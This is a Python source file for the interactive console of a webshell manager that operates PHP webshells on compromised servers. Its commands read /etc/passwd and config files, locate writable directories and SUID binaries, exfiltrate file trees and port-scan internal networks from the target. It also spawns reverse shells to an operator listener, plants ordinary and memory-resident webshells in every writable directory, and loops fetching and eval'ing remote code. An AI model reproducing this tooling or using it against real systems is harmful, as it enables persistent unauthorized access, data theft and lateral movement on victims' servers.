"""Interactive command loop, built on :mod:`cmd2`.

cmd2 gives us persistent history, tab-completion and ``help`` for free —
replacing v1's hand-rolled ``while True: raw_input()`` dispatcher.  Command
names mirror the v1 shortcuts (``p``, ``pv``, ``fwd`` ...) so muscle memory
carries over.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

import cmd2

from . import log
from .config import Config
from .core.webshell import WebShell
from .exceptions import WebshellError
from .features import database, files, inject, portscan, recon, revshell
from .utils.network import get_ip_address

BANNER = r"""
===================================================
           ____        _
          / ___| _ __ (_)_ __   ___ _ __
          \___ \| '_ \| | '_ \ / _ \ '__|
           ___) | | | | | |_) |  __/ |
          |____/|_| |_|_| .__/ \___|_|
                      |_|
===================================================
|     WebShell Manager Via Terminal (v2.0.0)      |
|  https://github.com/WangYihang/Webshell-Sniper  |
===================================================
"""


class Repl(cmd2.Cmd):
    prompt = "sniper => "

    def __init__(self, webshells: list[WebShell], config: Config):
        super().__init__(allow_cli_args=False)
        self.webshells = webshells
        self.config = config
        self.local_exec = True
        self.intro = BANNER
        for name in ("edit", "macro", "run_pyscript", "run_script", "shell", "shortcuts"):
            self.hidden_commands.append(name)
        # Long-form aliases mirroring v1's command names.
        self.aliases.update(
            {"print": "p", "read": "r", "quit": "q", "exit": "q", "h": "help"}
        )

    # -- helpers ---------------------------------------------------------------
    def _each(self, action, label: str) -> None:
        """Run ``action(ws)`` against every live webshell, isolating failures."""
        for ws in self.webshells:
            log.info(f"[{label}] {ws}")
            try:
                action(ws)
            except WebshellError as exc:
                log.error(f"{label} failed: {exc}")

    @staticmethod
    def _ask(prompt: str, default: str) -> str:
        return input(f"{prompt} ({default}): ").strip() or default

    # -- recon / info ----------------------------------------------------------
    def do_p(self, _: cmd2.Statement) -> None:
        """Print target info (URL, webroot, PHP & kernel version)."""
        for ws in self.webshells:
            log.success("=" * 40)
            log.success(f"URL           : {ws.url}")
            log.success(f"Method        : {ws.method}")
            log.success(f"Document root : {ws.webroot}")
            log.success(f"PHP version   : {ws.php_version}")
            log.success(f"Kernel        : {ws.kernel_version}")

    def do_pv(self, _: cmd2.Statement) -> None:
        """Show the PHP version."""
        self._each(lambda ws: log.success(ws.php_version), "php-version")

    def do_kv(self, _: cmd2.Statement) -> None:
        """Show the kernel version (uname -a)."""
        self._each(lambda ws: log.success(ws.kernel_version), "kernel-version")

    def do_c(self, _: cmd2.Statement) -> None:
        """Search the webroot for config/database files."""
        self._each(recon.find_config_files, "config")

    def do_fwd(self, _: cmd2.Statement) -> None:
        """Find writable directories under the webroot."""
        self._each(recon.find_writable_dirs, "writable-dirs")

    def do_fwpf(self, _: cmd2.Statement) -> None:
        """Find writable .php files under the webroot."""
        self._each(recon.find_writable_php, "writable-php")

    def do_gdf(self, _: cmd2.Statement) -> None:
        """List PHP disabled_functions on the target."""
        self._each(recon.get_disabled_functions, "disabled-funcs")

    def do_fsb(self, _: cmd2.Statement) -> None:
        """Find SUID-root binaries."""
        self._each(recon.find_suid_binaries, "suid")

    def do_r(self, line: cmd2.Statement) -> None:
        """read <path> — read a remote file (default /etc/passwd)."""
        path = str(line).strip() or self._ask("File path", "/etc/passwd")
        self._each(lambda ws: files.read_file(ws, path), "read")

    def do_rm(self, line: cmd2.Statement) -> None:
        """rm [path] — delete a remote file; with no path the shell deletes itself."""
        path = str(line).strip() or None
        if path is None:
            confirm = input("Delete the webshell ITSELF (you lose access)? [y/N]: ")
            if confirm.strip().lower() != "y":
                log.info("Aborted.")
                return
        self._each(lambda ws: files.remove(ws, path), "remove")

    # -- transfers -------------------------------------------------------------
    def do_dl(self, line: cmd2.Statement) -> None:
        """dl <path> — download a remote file or directory tree."""
        for ws in self.webshells:
            path = str(line).strip() or self._ask("Remote path", ws.webroot)
            log.info(f"[download] {ws}")
            try:
                if files.is_directory(ws, path):
                    name_filter = self._ask("Name filter", "*.php")
                    files.download_tree(ws, path, name_filter, output_dir=self.config.output_dir)
                else:
                    files.download(ws, path, self.config.output_dir)
            except WebshellError as exc:
                log.error(f"download failed: {exc}")

    def do_ul(self, line: cmd2.Statement) -> None:
        """ul <local-path> — upload a local file to the target(s)."""
        local = str(line).strip() or input("Local path: ").strip()
        if not local or not Path(local).is_file():
            log.error("Local file not found.")
            return
        for ws in self.webshells:
            remote = self._ask(f"Remote path on {ws.url}", f"{ws.webroot}/{Path(local).name}")
            log.info(f"[upload] {ws}")
            try:
                files.upload(ws, local, remote)
            except WebshellError as exc:
                log.error(f"upload failed: {exc}")

    def do_dla(self, _: cmd2.Statement) -> None:
        """Download a tree using custom `find` arguments (e.g. -size -500k)."""
        for ws in self.webshells:
            path = self._ask("Root path", ws.webroot)
            args = self._ask("find args", "-size -500k")
            log.info(f"[download-advanced] {ws}")
            try:
                files.download_tree(ws, path, find_args=args, output_dir=self.config.output_dir)
            except WebshellError as exc:
                log.error(f"download failed: {exc}")

    # -- pivots / shells -------------------------------------------------------
    def do_ps(self, _: cmd2.Statement) -> None:
        """Port-scan a CIDR range from the target."""
        hosts = self._ask("Hosts (CIDR)", "192.168.1.0/24")
        ports = self._ask("Ports", "21,22,80,443,445,3306,3389")
        self._each(lambda ws: portscan.port_scan(ws, hosts, ports), "portscan")

    def do_rsh(self, _: cmd2.Statement) -> None:
        """Spawn a reverse shell back to you (start your listener first)."""
        ip = self._ask("Listener IP", get_ip_address())
        port = int(self._ask("Listener port", "8888"))
        log.info(f"Listener hint: socat file:`tty`,raw,echo=0 tcp-l:{port}")
        self._each(lambda ws: revshell.reverse_shell(ws, ip, port), "revshell")

    def do_db(self, _: cmd2.Statement) -> None:
        """Open the MySQL manager (via the webshell)."""
        host = self._ask("MySQL host", "127.0.0.1")
        user = self._ask("Username", "root")
        password = self._ask("Password", "root")
        for ws in self.webshells:
            log.info(f"[database] {ws}")
            manager = database.MysqlManager(ws, host, user, password)
            if manager.check_connection():
                log.success("Connected.")
                self._database_repl(manager)

    def _database_repl(self, manager: database.MysqlManager) -> None:
        help_text = (
            "  d=databases  t=tables  c=columns  u=user  v=version  "
            "cd=current-db  e=exec-sql  q=quit"
        )
        log.info(help_text)
        while True:
            cmd = input("sniper(mysql) => ").strip().lower()
            try:
                if cmd in ("q", "quit", "exit"):
                    break
                elif cmd == "h":
                    log.info(help_text)
                elif cmd == "d":
                    log.success("\n".join(manager.databases()))
                elif cmd == "u":
                    log.success(manager.current_user())
                elif cmd == "v":
                    log.success(manager.version())
                elif cmd == "cd":
                    log.success(manager.current_database())
                elif cmd == "t":
                    db = self._ask("Database", manager.current_database())
                    log.success("\n".join(manager.tables(db)))
                elif cmd == "c":
                    db = self._ask("Database", manager.current_database())
                    table = input("Table: ").strip()
                    log.success("\n".join(manager.columns(db, table)))
                elif cmd == "e":
                    sql = input("SQL: ").strip()
                    rows = manager.query(sql)
                    for row in rows:
                        log.success(" | ".join(row))
                else:
                    log.warning(help_text)
            except WebshellError as exc:
                log.error(str(exc))

    # -- injection -------------------------------------------------------------
    def do_aiw(self, _: cmd2.Statement) -> None:
        """Auto-inject a plain webshell (blank password = random per directory)."""
        password = input("New password (blank = random per directory): ").strip() or None
        self._each(
            lambda ws: inject.inject_webshell(
                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
            ),
            "inject",
        )

    def do_aimw(self, _: cmd2.Statement) -> None:
        """Auto-inject a memory-resident webshell (blank password = random)."""
        password = input("New password (blank = random per directory): ").strip() or None
        self._each(
            lambda ws: inject.inject_memory_webshell(
                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
            ),
            "inject-memory",
        )

    def do_fr(self, _: cmd2.Statement) -> None:
        """Flag reaper (CTF): loop pulling+eval'ing code from your server."""
        host = self._ask("Your web server IP", get_ip_address())
        port = self._ask("Your web server port", "80")
        code_url = f"http://{host}:{port}/code.txt"
        self._each(
            lambda ws: inject.flag_reaper(ws, code_url, recon.find_writable_dirs(ws)),
            "flag-reaper",
        )

    # -- exec mode -------------------------------------------------------------
    def do_setl(self, _: cmd2.Statement) -> None:
        """Run unrecognised input on the LOCAL machine."""
        self.local_exec = True
        log.info("Unrecognised commands now run on localhost.")

    def do_setr(self, _: cmd2.Statement) -> None:
        """Run unrecognised input on the REMOTE target."""
        self.local_exec = False
        log.info("Unrecognised commands now run on the target.")

    def do_exec(self, line: cmd2.Statement) -> None:
        """exec <cmd> — explicitly run a command on the target."""
        command = str(line).strip()
        if command:
            self._each(lambda ws: log.raw(ws.run_command(command)), "exec")

    def default(self, statement: cmd2.Statement) -> None:
        command = statement.raw.strip()
        if not command:
            return
        if self.local_exec:
            log.info(f"[local] {command}")
            subprocess.run(command, shell=True)  # noqa: S602 - intentional local exec
        else:
            self._each(lambda ws: log.raw(ws.run_command(command)), "remote")

    # -- lifecycle -------------------------------------------------------------
    def do_q(self, _: cmd2.Statement) -> bool:
        """Quit (saving the live webshells to a timestamped JSON file)."""
        self._save()
        return True

    def _save(self) -> None:
        import json

        out = self.config.output_dir / f"webshells_{int(time.time())}.json"
        data = [ws.info.to_dict() for ws in self.webshells]
        out.write_text(json.dumps(data, indent=2))
        log.info(f"Saved {len(data)} webshell(s) to {out}")
